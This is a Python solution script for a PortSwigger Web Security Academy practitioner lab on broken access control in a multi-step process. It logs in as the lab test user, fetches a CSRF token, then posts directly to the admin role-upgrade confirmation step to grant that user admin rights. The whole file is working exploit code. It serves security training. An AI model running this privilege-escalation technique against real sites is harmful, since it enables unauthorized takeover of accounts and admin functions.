# Lab: Multi-step process with no access control on one step
# difficulty: practitioner
import urllib3
import requests
from pwn import log
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sub = '0a9e00fc03819cbd809a8663001e00c6'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(endpoint = '/') -> str:
    log.info(f'getting csrf token for {endpoint}')
    res = s.get(f'{url}{endpoint}',
                verify=False,
                proxies=proxy
                )
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        csrf = soup.find("input", {'name': 'csrf'})['value']
    except:
        log.error("csrf token not found")
        exit(1)
    return csrf

def login():
    csrf = get_csrf_token('/login')
    body = {
        'username': 'wiener',
        'password': 'peter',
        'csrf': csrf,
    }
    
    res = s.post(url + '/login', data=body)
    if res.status_code != 200:
        log.error('login failed')
        exit(1)
    log.success('login successful')
    log.info('cookie: %s', s.cookies['session'].replace('%3d', '='))

def exploit():
    res = s.post(f'{url}/admin-roles', data={
        'action': 'upgrade',
        'confirmed': True,
        'username': 'wiener'
    })

if __name__ == '__main__':
    global s
    s = requests.Session()

    login()
    exploit()